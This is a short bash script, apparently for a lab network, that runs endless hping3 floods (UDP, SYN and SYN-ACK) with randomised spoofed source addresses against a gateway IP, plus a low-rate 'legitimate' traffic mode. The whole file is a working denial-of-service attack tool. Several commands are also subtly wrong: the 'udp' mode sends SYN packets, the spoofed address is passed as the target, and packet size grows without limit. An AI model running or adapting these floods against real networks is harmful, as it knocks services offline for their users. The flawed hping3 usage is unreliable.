#!/bin/bash

# Target information
gateway_ip="10.1.5.3"  # Gateway IP
legitimate_client_ip="10.1.4.2"  # Client 3 IP

# Function to generate a random IP for spoofing
rand_ip() {
  echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}

# Parse command-line arguments
while getopts ":t:s:p:" opt; do
  case $opt in
    t) packet_type="$OPTARG" ;;
    s) packet_size="$OPTARG" ;;
    p) target_port="$OPTARG" ;;
    \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
  esac
done

# Set default values if not provided
packet_type=${packet_type:-udp}
packet_size=${packet_size:-1024}
target_port=${target_port:-80}

# Continuous attack loop
while true; do
  # Generate a random source IP (spoof if type is not legitimate)
  if [[ "$packet_type" == "legitimate" ]]; then
    spoofed_ip="$legitimate_client_ip"
  else
    spoofed_ip=$(rand_ip)
  fi
  # Add some randomness to packet size
  packet_size=$((packet_size + RANDOM % 128)) 

  case "$packet_type" in
    udp)
      hping3 -c 10000 -d "$packet_size" -S --flood -p "$target_port" $spoofed_ip --interface eth1 $gateway_ip
      ;;
    syn)
      hping3 -c 10000 -d "$packet_size" --syn --flood -p "$target_port" --interface eth1 $spoofed_ip 
      ;;
    syn-ack)
      hping3 -c 10000 -d "$packet_size" -S -A --flood -p "$target_port" --interface eth1 $spoofed_ip 
      ;;
    legitimate)
      hping3 -c 1 -d "$packet_size" -p "$target_port" $spoofed_ip 
      sleep 1  # Send one legitimate packet per second
      ;;
    *)
      echo "Invalid packet type: $packet_type" >&2
      exit 1
      ;;
  esac
done 
